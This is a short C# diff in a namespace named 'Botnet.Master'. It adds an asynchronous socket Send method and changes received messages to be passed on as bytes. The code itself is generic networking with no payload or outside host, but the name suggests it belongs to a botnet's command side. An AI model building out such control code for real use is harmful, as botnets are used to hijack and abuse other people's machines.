@@ -36,6 +36,12 @@ namespace CozyThunder.Botnet.Master
             return true;
         }
 
+        public bool Send(byte[] byteData)
+        {
+            socket_.BeginSend(byteData, 0, byteData.Length, 0, new AsyncCallback(SendCallback), socket_);
+            return true;
+        }
+
         void ConnectCallback(IAsyncResult ar)
         {
             try
@@ -72,7 +78,7 @@ namespace CozyThunder.Botnet.Master
                 {
                     state.sb.Append(Encoding.ASCII.GetString(state.buffer, 0, bytesRead));
                     String content = state.sb.ToString();
-                    listener_?.OnMessage(peer_, content);
+                    listener_?.OnMessage(peer_, Encoding.ASCII.GetBytes(content));
                 }
                 handler.BeginReceive(state.buffer, 0, StateObject.BufferSize, 0, new AsyncCallback(ReadCallback), state);
             }
